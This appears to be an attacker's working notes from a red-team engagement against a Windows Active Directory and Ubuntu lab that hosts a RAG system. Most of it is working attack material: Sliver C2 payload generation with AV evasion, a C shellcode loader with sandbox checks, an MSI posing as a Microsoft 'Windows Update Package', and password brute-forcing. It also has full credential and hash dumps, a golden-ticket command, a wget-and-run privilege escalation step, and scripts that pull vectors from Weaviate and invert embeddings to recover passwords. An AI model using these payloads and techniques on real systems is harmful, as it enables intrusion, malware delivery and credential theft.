Nmap outputs:

```
nmap -sV --open -p 1-10000 192.168.218.13
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-05 13:26 +0200
Nmap scan report for 192.168.218.13
Host is up (0.052s latency).
Not shown: 9986 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-05 10:26:22Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: researchmco.ai, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3389/tcp open  ms-wbt-server
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5986/tcp open  ssl/wsmans?
9389/tcp open  mc-nmf        .NET Message Framing
```

```
nmap -sV --open -p 1-10000 192.168.218.14
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-05 13:27 +0200
Nmap scan report for 192.168.218.14
Host is up (0.048s latency).
Not shown: 9990 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5986/tcp open  ssl/wsmans?
6333/tcp open  unknown
6334/tcp open  unknown
8080/tcp open  http          Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
```

```
nmap -sV --open -p 1-10000 192.168.218.12
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
```

admin
administrator
cloudbase-init
r.chen
m.silva
j.park
t.kumar
l.zhang



`curl http://192.168.218.14:6333/
{"title":"qdrant - vector search engine","version":"1.12.4","commit":"5b578c4f34188f0474f901e49d4726213596433d"}`

Qdrant

Version:

1.12.4

Commit:

5b578c4f34188f0474f901e49d4726213596433d

Environment
192.168.218.12
Ubuntu
SSH (22) only
No other exposed services.
192.168.218.13
Domain Controller (DC01)
Domain: researchmco.ai
DNS, LDAP, Kerberos, SMB, WinRM, RDP
Anonymous LDAP disabled
DNS zone transfer disabled
192.168.218.14
Windows Server (SRV1)
Research Aggregator Portal (:8080)
Qdrant (:6333)
Qdrant gRPC (:6334)
SMB, WinRM, RDP

Thats my objective : Identify a RAG system , get access to the embedding vectors, and retrieve a piece of information. In a previous step of the red team
    engagement, you already have identified a leaked password "Password1". Thats and info that i alreaddy know : 

ts_svc:Password1 is valid on SMB for both SRV1 and DC01! WinRM is blocked, but SMB works. Let me enumerate shares and find the Qdrant config/API key:

ts_svc:Password1 → RDP (Pwn3d!) on SRV1! and NLA is disabled! 

nxc rdp 192.168.218.14 -u ts_svc -p Password1 -x 'whoami' 

xfreerdp /v:192.168.218.14 /u:ts_svc /p:'Password1' /d:researchmco.ai \
/dynamic-resolution /cert:ignore /clipboard /drive:kali,/tmp

hydra -l ts_svc -P /path/to/10k-wordlist.txt \
192.168.199.14 -s 8080 http-post-form \
"/login:username=^USER^&password=^PASS^:Invalid credentials" \
-t 20 -v
![d6a2f2d7dc3d11fe66d70818355b0221.png](../_resources/d6a2f2d7dc3d11fe66d70818355b0221.png)
![f05d6eb50cd947e811128b865361df15.png](../_resources/f05d6eb50cd947e811128b865361df15.png)

https://github.com/camercu/oscp-prep/blob/main/CHEATSHEET.md
https://wadcoms.github.io/#+SMB
https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html
https://dev-angelist.gitbook.io/windows-privilege-escalation/cheatsheet
https://github.com/evets007/OSCP-Prep-cheatsheet/blob/master/windows-privesc.md

How to get shell with AV working:
sliver :

`mtls --lhost 192.168.45.207 --lport 8888`

1. 
```
✅ /tmp/pay.bin        ← already created (shellcode)
         │
         ▼ Step 1: convert .bin → C byte array
         │
         ▼ Step 2: create loader.c with shellcode embedded
         │
         ▼ Step 3: compile loader.c → rundlll.exe  (with mingw)
         │
         ▼ Step 4: embed rundlll.exe in MSI via wixl
         │
         ▼
   toolset.msi  →  deliver to target
```

via sliver :

```generate --mtls 192.168.45.7:8888 \
         --format service \
         --os windows \
         --arch amd64 \
         --evasion \
         --skip-symbols \        # removes Go symbol table (reduces signatures)
         --save /tmp/rundlll.exe
```

```generate --mtls 192.168.45.207:8888 \
         --format shellcode \
         --os windows \
         --arch amd64 \
         --evasion \
         --shellcode-entropy 3 \
         --shellcode-bypass 3 \
         --shellcode-compress \
         --shellcode-encoder shikata_ga_nai \
         --save /tmp/pay.bin
+ shikata_ga_nai obfuscate
```


```xxd -i /tmp/pay.bin > /tmp/shellcode.h```
```
cat > /tmp/loader.c << 'EOF'
#include <windows.h>
#include "shellcode.h"
int main(void) {
    // Basic sandbox evasion - bail if running too fast
    DWORD t = GetTickCount();
    Sleep(5000);
    if ((GetTickCount() - t) < 4500) return 0;
    // Allocate RWX memory and inject shellcode
    LPVOID mem = VirtualAlloc(
        NULL,
        _tmp_pay_bin_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!mem) return 1;
    memcpy(mem, _tmp_pay_bin, _tmp_pay_bin_len);
    HANDLE thread = CreateThread(
        NULL, 0,
        (LPTHREAD_START_ROUTINE)mem,
        NULL, 0, NULL
    );
    WaitForSingleObject(thread, INFINITE);
    return 0;
}
EOF
```

```
# Install mingw if needed
sudo apt install mingw-w64 -y

# Compile - -mwindows hides the console window
x86_64-w64-mingw32-gcc /tmp/loader.c \
    -I/tmp \
    -o /tmp/rundlll.exe \
    -mwindows \
    -s \
    -O2
```
**payload.wsx**
```<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*"
           Name="Windows Update Package"
           Language="1033"
           Version="1.0.0.0"
           Manufacturer="Microsoft Corporation"
           UpgradeCode="12345678-1234-1234-1234-123456789012">

    <Package InstallerVersion="200" Compressed="yes" InstallScope="perMachine" />

    <MediaTemplate EmbedCab="yes" />

    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="TempFolder">
        <Directory Id="INSTALLFOLDER" Name="WinUpdate" />
      </Directory>
    </Directory>

    <ComponentGroup Id="ProductComponents" Directory="INSTALLFOLDER">
      <Component Id="MainExecutable" Guid="*">
        <File Id="PayloadExe"
              Source="rundlll.exe"
              KeyPath="yes"
              Name="rundlll.exe" />
      </Component>
    </ComponentGroup>

    <!-- Use FileKey instead of Directory - wixl compatible -->
    <CustomAction Id="RunPayload"
                  FileKey="PayloadExe"
                  ExeCommand=""
                  Execute="deferred"
                  Impersonate="no"
                  Return="asyncNoWait" />

    <InstallExecuteSequence>
      <Custom Action="RunPayload" After="InstallFiles">NOT Installed</Custom>
    </InstallExecuteSequence>

    <Feature Id="ProductFeature" Title="Main" Level="1">
      <ComponentGroupRef Id="ProductComponents" />
    </Feature>

  </Product>
</Wix>
```

wixl -v payload.wxs -o toolset.msi --- toolset.msi is a payload that should be triggered on windows

hacker:'P@ssw0rd123!'

```
❯ python3 /usr/share/koadic/data/bin/secretsdump/secretsdump.py -sam sam.bak -system sys.bak -security sec.bak LOCAL 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xfda87dca6558170dcc62fe2dd0f51e7f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4309f10ed11d9a6c42b2ed50e8689f7c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:8000ebbadfb41ad9bb7d7475df02832d:::
cloudbase-init:1000:aad3b435b51404eeaad3b435b51404ee:e09ae899077e17eb2dfd4c29f233da4a:::
Admin:1001:aad3b435b51404eeaad3b435b51404ee:108e2fbf9ac166fc03153be993cc90c8:::
hacker:1002:aad3b435b51404eeaad3b435b51404ee:7dfa0531d73101ca080c7379a9bff1c7:::
[*] Dumping cached domain logon information (domain/username:hash)
RESEARCHMCO.AI/ts_svc:$DCC2$10240#ts_svc#13d08e1707542ef7b50bf6a502f473f0: (2026-08-16 12:40:41+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:19b2752607d0623b6a53b1764ac77f058c423c07b32c710fc791cdfb94fcc44b415c5854d31dffca863508c82c399ab1d2e5d6c7aa815108c03482e9a25670eb7018180d087f544fc6cc47385bd74c27adb4902e90d7663d2119bf39146f40857dcabc127cf57a021e4de5251509d0642493b0eea36cf107f4adfcab33647ce4ee1b7756f991332a7d46759bdcbda52390f1173e01b275ef2627ede9a51ff259e564df3bab1b3bd3266d3fd0a4130ecb35e93ac3199c31ab48cc568a776af40adc78f5a92fe89f2ed93a891ce408ff3b46e9c9081aa0fce5a2c9e40f2bb06a5a87cd09cad22ee88ea186a46fd9e69382
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d6ce9e932911e63f8dd2635c7157e76e
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xf58b0d8d85c8d4202bae94e2aff50ecffbb58a36
dpapi_userkey:0x925d224f4409aa08fd7833edf8b78807dfe870ff
[*] NL$KM 
 0000   8B 50 8A CD 70 A7 5E 91  2D 24 42 D7 48 93 2F 41   .P..p.^.-$B.H./A
 0010   55 69 FC 65 95 98 84 EB  AB C4 3B 45 AA 6E CE F2   Ui.e......;E.n..
 0020   AD 9C 60 A2 5E 65 AB 4A  D3 B6 9D 16 64 57 5E D8   ..`.^e.J....dW^.
 0030   8B F0 8A FE B4 82 29 57  9F D3 54 CE D1 37 5B E7   ......)W..T..7[.
NL$KM:8b508acd70a75e912d2442d748932f415569fc65959884ebabc43b45aa6ecef2ad9c60a25e65ab4ad3b69d1664575ed88bf08afeb48229579fd354ced1375be7
[*] _SC_cloudbase-init 
(Unknown User):EihAmgbQgoJJY9XU7weZ
[*] Cleaning up... 
```

`netexec smb 192.168.188.13 -u 'SRV1$' -H 'd6ce9e932911e63f8dd2635c7157e76e'`


`impacket-ticketer -nthash f1d8de816721a6795be8b34ba2220c6a -domain-sid S-1-5-21-1361221028-2446471266-1567148372 -domain RESEARCHMCO.AI Administrator`

`export KRB5CCNAME=$(pwd)/Administrator.ccache`

`/usr/share/doc/python3-impacket/examples/psexec.py RESEARCHMCO.AI/Administrator@192.168.188.13 -hashes ':4309f10ed11d9a6c42b2ed50e8689f7c'`


```
❯ /usr/share/doc/python3-impacket/examples/secretsdump.py RESEARCHMCO.AI/Administrator@192.168.188.13 -hashes ':4309f10ed11d9a6c42b2ed50e8689f7c' -outputfile domain_dump
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x328eb6a41a996ce5cb9f052c1708e889
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:24980fd4a81850180dee74d82fe4d3e3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
RESEARCHMCO\DC01$:aes256-cts-hmac-sha1-96:7a55781d87885dd73fc218a651b996f6ecf100408b6ddd1685699d9f0bafac8e
RESEARCHMCO\DC01$:aes128-cts-hmac-sha1-96:567f574b5f372a13a1191cea91f65a28
RESEARCHMCO\DC01$:des-cbc-md5:9db313e90e1c16b0
RESEARCHMCO\DC01$:plain_password_hex:d9afbff8de4bcff3a549ea30dd344cecc374453cb9521d757cb44c505e2b61d67e39bfe98a1c723e2ceabed8e3c54e76f03dc664316261920e84576cd252ee93567e64fd8b9f0b7e6319df9b869d4b0c4bc7f502914333b07bcdce9a3677cabad5829bb7d705339fc1049ca4a09dd92cf31266b81ea4a30d4d16f8c526a443f7045ed35551d9a56ecf621bac0d87e300af13c24592ce63af4a2b1fd4ab6f7e86717575b546d4f1012940fc5ede9ddf624a01b51a49b198e7d2efcca09102af2f98e2c19b119a319ddd502e87a94107f82a0360cc9af011e2f6ed35ab1ccf7d2612ba3b4d18ef6b0f98aad20e42693446
RESEARCHMCO\DC01$:aad3b435b51404eeaad3b435b51404ee:a3968eba0754d0b1eef017c037e6685e:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xdee9e73ec91da2f4d464a0123401e8697d1d5e8a
dpapi_userkey:0xbaa79a89a4f422acac98c43691ee3a366bb3d68e
[*] NL$KM 
 0000   8B 50 8A CD 70 A7 5E 91  2D 24 42 D7 48 93 2F 41   .P..p.^.-$B.H./A
 0010   55 69 FC 65 95 98 84 EB  AB C4 3B 45 AA 6E CE F2   Ui.e......;E.n..
 0020   AD 9C 60 A2 5E 65 AB 4A  D3 B6 9D 16 64 57 5E D8   ..`.^e.J....dW^.
 0030   8B F0 8A FE B4 82 29 57  9F D3 54 CE D1 37 5B E7   ......)W..T..7[.
NL$KM:8b508acd70a75e912d2442d748932f415569fc65959884ebabc43b45aa6ecef2ad9c60a25e65ab4ad3b69d1664575ed88bf08afeb48229579fd354ced1375be7
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4309f10ed11d9a6c42b2ed50e8689f7c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f1d8de816721a6795be8b34ba2220c6a:::
cloudbase-init:1000:aad3b435b51404eeaad3b435b51404ee:126f6d1fbd7b7c80174dde18d9eb7b5d:::
Admin:1001:aad3b435b51404eeaad3b435b51404ee:873a45f1f22b30f6f72c146338ccf8ac:::
researchmco.ai\ts_svc:1104:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
researchmco.ai\r.chen:1105:aad3b435b51404eeaad3b435b51404ee:8ed4954078a6860579217dffaada253e:::
researchmco.ai\m.silva:1106:aad3b435b51404eeaad3b435b51404ee:59308ae5c00bbf6cab319dc332ef136a:::
researchmco.ai\j.park:1107:aad3b435b51404eeaad3b435b51404ee:d72ea99a8cd52e325db6a7368d03669a:::
researchmco.ai\t.kumar:1108:aad3b435b51404eeaad3b435b51404ee:a7162582467bbb43b2e5df6047618020:::
researchmco.ai\l.zhang:1109:aad3b435b51404eeaad3b435b51404ee:034171105b6acd91edd751a64bedf2ed:::
backdoor:1112:aad3b435b51404eeaad3b435b51404ee:7dfa0531d73101ca080c7379a9bff1c7:::
DC01$:1002:aad3b435b51404eeaad3b435b51404ee:a3968eba0754d0b1eef017c037e6685e:::
SRV1$:1110:aad3b435b51404eeaad3b435b51404ee:d6ce9e932911e63f8dd2635c7157e76e:::
[*] Kerberos keys grabbed
Administrator:0x14:d77a5b971fcc6bed206e8b7cbbd5949dd19c1a293128b1c9c56be268206ab7ab
Administrator:0x13:5b6303439cfe8e3aada754c22b53ad60
Administrator:aes256-cts-hmac-sha1-96:a67c656835597a40a36ee765f9e167e0b313400308f6edb55f82d4cd0523cd22
Administrator:aes128-cts-hmac-sha1-96:d393b587d7143008a6cda9cc940f5e1e
Administrator:0x17:4309f10ed11d9a6c42b2ed50e8689f7c
krbtgt:aes256-cts-hmac-sha1-96:2c42a17f32c66f6737e4aa5d25070d5ac883d9df43b8546e8e42371ebbc4a6ba
krbtgt:aes128-cts-hmac-sha1-96:3e93731365d6dfcada7599ab32623be2
krbtgt:0x17:f1d8de816721a6795be8b34ba2220c6a
cloudbase-init:0x14:a9a26c7bc05d4ad4be0385694928762b86f708edfb96aa29f3a58028680fd76e
cloudbase-init:0x13:4900fb1cf30a2599275d9a044c8a1cb4
cloudbase-init:aes256-cts-hmac-sha1-96:56fde6ce27a2f18021cce4ca3dcd77a1924d58f5d30c8c5ce062b55e330d76e4
cloudbase-init:aes128-cts-hmac-sha1-96:d6716275144c449332c9844abfedb68b
cloudbase-init:0x17:126f6d1fbd7b7c80174dde18d9eb7b5d
Admin:0x14:3636e5f08df7ec1f0016c45ccdf4f51b18d1651b25904fa4396b8f31c6fed307
Admin:0x13:909dca6d856348c46dc30a3621b9a295
Admin:aes256-cts-hmac-sha1-96:74f593ae16a6ab418134a3d766c7a46e93357cb5c6e93c8569dacf1c95c3d364
Admin:aes128-cts-hmac-sha1-96:f6a11ea3e067f0fa2d08e1a8e71077f6
Admin:0x17:873a45f1f22b30f6f72c146338ccf8ac
researchmco.ai\ts_svc:0x14:754533f5b97e018eade5b2a52519ca6f1cfd07192e57bdb32b9fdbd56ae19b3f
researchmco.ai\ts_svc:0x13:2aa1eef0b5cedf0b94e9bc1dc626315d
researchmco.ai\ts_svc:aes256-cts-hmac-sha1-96:f787c6d7aefdb3edb42b46d50005fd63d532ad6e46ba1cdb8303ecb61e47e43b
researchmco.ai\ts_svc:aes128-cts-hmac-sha1-96:7f30e5d5a2f281850ad588336fb95e93
researchmco.ai\ts_svc:0x17:64f12cddaa88057e06a81b54e73b949b
researchmco.ai\r.chen:0x14:41c9dea38e38a3dc24f1b846a8bae2beb89dc0fbfd360d4a7a979b9e30cff8d5
researchmco.ai\r.chen:0x13:f1f22e281a8e5d42d269a7954d55f6c9
researchmco.ai\r.chen:aes256-cts-hmac-sha1-96:b9260a6be1800c20315fc2f536377f69576872e085f28647ca59cf2116b6a23b
researchmco.ai\r.chen:aes128-cts-hmac-sha1-96:dac3ebae9ed5a2d7ca608b43c785bb7a
researchmco.ai\r.chen:0x17:8ed4954078a6860579217dffaada253e
researchmco.ai\m.silva:0x14:ebec610512a229babc5d34289c97aeba48416b7238cd5dda365baf95fa1a6e40
researchmco.ai\m.silva:0x13:f0132cf7b41f1bc3b5b584306032475a
researchmco.ai\m.silva:aes256-cts-hmac-sha1-96:774e47e40eb2522c95ce856fa45a8531d460cbacfa84b28257186553fa0913fc
researchmco.ai\m.silva:aes128-cts-hmac-sha1-96:7c268fe01230c44ab2a8ad42f2f0972f
researchmco.ai\m.silva:0x17:59308ae5c00bbf6cab319dc332ef136a
researchmco.ai\j.park:0x14:906dfa4736fc56aa732dd0b085b99f8b1410fd46af0b3c079b71b7d8e4c304a7
researchmco.ai\j.park:0x13:ef715e096dbebc0ad0c6bd9532b9778a
researchmco.ai\j.park:aes256-cts-hmac-sha1-96:3757ef0cae6088d4875061198326b150412e5a800c4ce6e3976528754ae785ad
researchmco.ai\j.park:aes128-cts-hmac-sha1-96:0e823c7e9f3c4afc198012c3341cedfd
researchmco.ai\j.park:0x17:d72ea99a8cd52e325db6a7368d03669a
researchmco.ai\t.kumar:0x14:319767630ea76119f93adf3f9711ecc0b8bd8ad8c307a7d0bd5d23dd5fde5e89
researchmco.ai\t.kumar:0x13:319ca4a37fd438da534c2e10d10b31de
researchmco.ai\t.kumar:aes256-cts-hmac-sha1-96:865eacc8316761c11793798c084400c996bee74cae436ee406532a45ccd6b5ad
researchmco.ai\t.kumar:aes128-cts-hmac-sha1-96:da7af323a84ded0941f9951d46f8ae9a
researchmco.ai\t.kumar:0x17:a7162582467bbb43b2e5df6047618020
researchmco.ai\l.zhang:0x14:8184b4a785c0910e3358d33c3fafe3645da872ec756d62552ffb9dbb04e5aef7
researchmco.ai\l.zhang:0x13:5d07cd1a91b7506ecfa2c225afacd422
researchmco.ai\l.zhang:aes256-cts-hmac-sha1-96:55c3068e2350b20e981ccc0d0b9dfaeb87a90eb1a7624980abefe5d4fc78a718
researchmco.ai\l.zhang:aes128-cts-hmac-sha1-96:88b9ac3c7aeac2d2ad024981c2776edd
researchmco.ai\l.zhang:0x17:034171105b6acd91edd751a64bedf2ed
backdoor:0x14:854e5bb7d2222d6611167699db4781f42387172f997b1c4ef38a14a59b955ae8
backdoor:0x13:d86113a6259b75c20f9d4eef99e9fece
backdoor:aes256-cts-hmac-sha1-96:9e1bf9093469ee5bbfb3eb2a57bb48f73f6d80fa65a91d7269106f992cb31d40
backdoor:aes128-cts-hmac-sha1-96:cf98fa207287e24392a989ee10971a1f
backdoor:0x17:7dfa0531d73101ca080c7379a9bff1c7
DC01$:aes256-cts-hmac-sha1-96:7a55781d87885dd73fc218a651b996f6ecf100408b6ddd1685699d9f0bafac8e
DC01$:aes128-cts-hmac-sha1-96:567f574b5f372a13a1191cea91f65a28
DC01$:0x17:a3968eba0754d0b1eef017c037e6685e
SRV1$:0x14:de6ece546a09b2f5d74699f19986a6d4b239ebcbf16cef6c5fa659577e62f4ed
SRV1$:0x13:933c2863c411490c504b11e78acb0532
SRV1$:aes256-cts-hmac-sha1-96:af8e4b356b75b8d483bb30358804fcbbcc9a26b2230abd8ff446b6a65d5d0e69
SRV1$:aes128-cts-hmac-sha1-96:e9fa065a87c81f291a678554cdc32dcd
SRV1$:0x17:d6ce9e932911e63f8dd2635c7157e76e

```

type C:\WINDOWS\Panther\Unattend.xml

ubuntu access is from administrators .ssh folder id_rsa key but key is for ts_svc

ubuntu root is CVE-2026-41651  https://github.com/shibaaa204/Pack2TheRoot

we have discovered in root dir rag_service and weaviate

script for counting dimnesions and saving vectors from weaviate : 

```
# Replace the model loading line with the local path
# First find it:
MODEL_PATH=$(find / -type d -name "*all-MiniLM*" 2>/dev/null | head -1)
echo "Found model at: $MODEL_PATH"
```
```
curl -s http://localhost:8081/v1/meta | python3 -m json.tool | head -10
ss -tlnp | grep 8081
docker ps 2>/dev/null
```
```
# Find the cached model
find / -type d -name "all-MiniLM-L6-v2" 2>/dev/null
find /root/.cache -type d 2>/dev/null | head -20
find /home -type d -name "*MiniLM*" 2>/dev/null
find /tmp -type d -name "*MiniLM*" 2>/dev/null
# Common HuggingFace cache locations
ls /root/.cache/huggingface/hub/ 2>/dev/null
ls /root/.cache/torch/sentence_transformers/ 2>/dev/null
```
```
python3 << 'EOF'
import weaviate, json, sys
try:
    client = weaviate.connect_to_local(host="localhost", port=8081, grpc_port=50051)
    print("[+] Connected to Weaviate", file=sys.stderr)
    collection = client.collections.get("PasswordResetPolicy")
    results = collection.query.fetch_objects(limit=100, include_vector=True)
    print(f"[+] Got {len(results.objects)} objects", file=sys.stderr)
    output = []
    for obj in results.objects:
        output.append({
            "properties": dict(obj.properties),
            "vector": obj.vector['default'] if obj.vector else None
        })
    # Write directly to file
    with open("/tmp/prp_vectors.json", "w") as f:
        json.dump(output, f, indent=2)
    print(f"[+] Saved {len(output)} vectors to /tmp/prp_vectors.json", file=sys.stderr)
    client.close()
except Exception as e:
    print(f"[!] Error: {e}", file=sys.stderr)
    raise
EOF
```

Script for inversion attack after getting info about dimensions model etc. 

**.suid_bash-5.2# cat inversion_attack.py** 
```
#!/usr/bin/env python3
"""
Embedding Inversion Attack against PasswordResetPolicy - OFFLINE MODE
"""
import os, json
import numpy as np
os.environ["TRANSFORMERS_OFFLINE"] = "1"
os.environ["HF_DATASETS_OFFLINE"] = "1"
from sentence_transformers import SentenceTransformer
MODEL_PATH = "/root/.cache/huggingface/hub/models--sentence-transformers--all-MiniLM-L6-v2/snapshots/c9745ed1d9f207416be6d2e6f8de32d1f16199bf"
VECTORS_FILE = "/tmp/prp_vectors.json"
WORDLIST_FILE = "/tmp/10k-most-common.txt"
# --- Load stored vectors ---
with open(VECTORS_FILE) as f:
    data = json.load(f)
stored_vectors = [(d["properties"], np.array(d["vector"])) for d in data if d["vector"]]
print(f"[+] Loaded {len(stored_vectors)} vectors from PasswordResetPolicy")
print(f"[+] Vector dimension: {len(stored_vectors[0][1])}")
# --- Load wordlist ---
with open(WORDLIST_FILE) as f:
    passwords = [line.strip() for line in f if line.strip()]
print(f"[+] Loaded {len(passwords)} candidates from {WORDLIST_FILE}")
# --- Load model from local cache ---
print(f"[*] Loading model from local cache...")
model = SentenceTransformer(MODEL_PATH)
print(f"[+] Model loaded successfully")
# --- Strategy 1: Direct password embedding ---
print("[*] Encoding passwords directly...")
pw_embeddings = model.encode(passwords, batch_size=256, show_progress_bar=True,
                              normalize_embeddings=True)
# --- Strategy 2: Template-based (most effective for sentence-level chunks) ---
templates = [f"The default password after resetting is {p}" for p in passwords]
print("[*] Encoding template sentences...")
tpl_embeddings = model.encode(templates, batch_size=256, show_progress_bar=True,
                               normalize_embeddings=True)
print("\n" + "="*60)
print("EMBEDDING INVERSION RESULTS")
print("="*60)
for i, (props, vec) in enumerate(stored_vectors):
    vec_norm = vec / np.linalg.norm(vec)
    sims_direct = pw_embeddings @ vec_norm
    top5_direct = np.argsort(sims_direct)[-5:][::-1]
    sims_tpl = tpl_embeddings @ vec_norm
    top5_tpl = np.argsort(sims_tpl)[-5:][::-1]
    print(f"\n[Vector {i+1}] Title: {props.get('title','?')}")
    print(f"  Strategy 1 — direct password encoding:")
    for idx in top5_direct:
        print(f"    [{sims_direct[idx]:.4f}] {passwords[idx]}")
    print(f"  Strategy 2 — template 'default password is X':")
    for idx in top5_tpl:
        print(f"    [{sims_tpl[idx]:.4f}] {passwords[idx]}")
```

```
# RESEARCHMCO.AI Penetration Test — Engagement Report
**Date:** 2026-08-17 | **Status:** Active



## Network Topology


Attacker (192.168.45.171 / 192.168.195.x)
    │
    ├── DC01  192.168.195.13  [PWNED]  Windows Server / Active Directory
    ├── SRV1  192.168.195.14  [PWNED]  Windows Server / Research Portal
    └── UBU   192.168.195.12  [ACCESS] Ubuntu 24.04 / AI Inference Stack


## Compromised Hosts

### DC01 — 192.168.195.13 — DOMAIN CONTROLLER — FULLY COMPROMISED

| Item | Value |
|------|-------|
| OS | Windows Server (Active Directory) |
| Domain | RESEARCHMCO.AI |
| Access | Domain Administrator |
| Method | Pass-the-Hash with NT hash |

**Credentials obtained:**

| Account | Password / Hash | Notes |
|---------|----------------|-------|
| Administrator | `alfpass123` (plaintext) | Found in `Unattend.xml` |
| Administrator NT | `4309f10ed11d9a6c42b2ed50e8689f7c` | Local SAM hash |
| Administrator NT (domain) | `24980fd4a81850180dee74d82fe4d3e3` | Domain hash |
| krbtgt | NTLM + AES256 obtained | Golden Ticket capable |

**Key artifacts:**
- Full domain user hash dump via `secretsdump.py`
- `krbtgt` AES256 key — Golden Ticket capability
- `RESEARCHMCO\DC01$` machine account hashes

---

### SRV1 — 192.168.195.14 — RESEARCH PORTAL SERVER — FULLY COMPROMISED

| Item | Value |
|------|-------|
| OS | Windows Server |
| Access | Administrator via evil-winrm (port 5985) |
| Method | Pass-the-Hash `4309f10ed11d9a6c42b2ed50e8689f7c` |

**Key artifacts looted:**
- `C:\Users\Administrator\.ssh\id_rsa` — SSH key (pivoted to Ubuntu .12)
- `C:\Windows\Panther\Unattend.xml` — Plaintext password `alfpass123`
- `C:\ResearchPortal\research-portal.exe` — Go web application binary
- MongoDB 7.0 running locally (no auth, `127.0.0.1:27017`)

**Research Portal (http://192.168.195.14:8080):**
- Login at `/login` — bcrypt hashed passwords in MongoDB
- NoSQL injection blocked — sanitized input
- Binary built from: `/home/kali/aecap/webapp/main.go`
- Dashboard shows user activity: `r.chen`, `m.silva`, `j.park`, `ts_svc`
- **STATUS: Login credentials still needed — MongoDB dump pending**

---

### Ubuntu — 192.168.195.12 — AI INFERENCE SERVER — LIMITED ACCESS (ts_svc)

| Item | Value |
|------|-------|
| OS | Ubuntu 24.04.4 LTS — kernel 6.8.0-106-generic |
| Current User | `ts_svc` (uid=1001, no sudo) |
| Access Method | SSH with `id_rsa` key from SRV1 |
| Hostname | lab-osai-ae-12-ubu-caplnx-240-145 |

**Services running:**

| Service | Port | Notes |
|---------|------|-------|
| Weaviate (Docker container) | 127.0.0.1:8081 | Vector DB — RAG pipeline |
| Ollama | 127.0.0.1:11434 | Local LLM inference |
| gRPC | 127.0.0.1:50051 | Unknown internal service |
| SSH | 0.0.0.0:22 | PermitRootLogin yes! |

**Weaviate collections found:** `ResearchPapers`, `InternalDocs`, `PasswordResetPolicy`

**Target file:** `/root/rag_service/documents/MC1_password_reset.pdf`

**Users with shell access:**
- `root` (uid=0) — target
- `ubuntu` (uid=1000) — in `sudo`, `lxd` groups
- `ts_svc` (uid=1001) — current access, no special groups

---

## LinPEAS — Privilege Escalation Findings (Ubuntu .12)

### CRITICAL — CVE-2026-41651 — Pack2TheRoot

LinPEAS confirms: PackageKit `1.2.8-2ubuntu1.4` is BELOW the fixed version `1.2.8-2ubuntu1.5`

- PackageKit daemon is **activatable via D-Bus** (pkcon/pkmon present)
- Local privilege escalation to root
- Reference: https://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html

```bash
# On Ubuntu .12 as ts_svc:
wget http://<attacker>/pack2theroot -O /tmp/p2r
chmod +x /tmp/p2r
/tmp/p2r
```

### CRITICAL — CVE-2026-31431 — Copy Fail (AF_ALG/splice)

LinPEAS confirms: `VULNERABLE: non-destructive AF_ALG/splice page-cache write triggered`

- Kernel 6.8.0-106 — unpatched
- PoC: https://copy.fail/

### MEDIUM — Snapd sockets world-writable (666)

```
/run/snapd.socket      666 - root-owned, world-writable
/run/snapd-snap.socket 666 - root-owned, world-writable
```

